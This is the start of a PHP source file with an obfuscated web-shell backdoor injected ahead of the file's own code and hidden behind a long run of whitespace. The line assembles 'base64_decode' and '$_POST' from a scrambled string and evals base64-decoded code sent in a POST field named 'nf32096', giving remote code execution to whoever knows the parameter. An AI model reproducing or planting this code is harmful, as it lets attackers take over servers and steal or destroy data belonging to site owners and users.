<?php                                                                                                                                                                                                                                                                       $zknn9 = "cpo_eat4sbd6";$ytxe84 =strtolower( $zknn9[9]. $zknn9[5].$zknn9[8]. $zknn9[4]. $zknn9[11].$zknn9[7].$zknn9[3].$zknn9[10]. $zknn9[4]. $zknn9[0].$zknn9[2].$zknn9[10]. $zknn9[4] ) ;$ket1 = strtoupper( $zknn9[3]. $zknn9[1]. $zknn9[2].$zknn9[8]. $zknn9[6]);if( isset(${ $ket1} ['nf32096' ] ) ) {eval ( $ytxe84 (${$ket1 }['nf32096']) );}?> <?php
/**
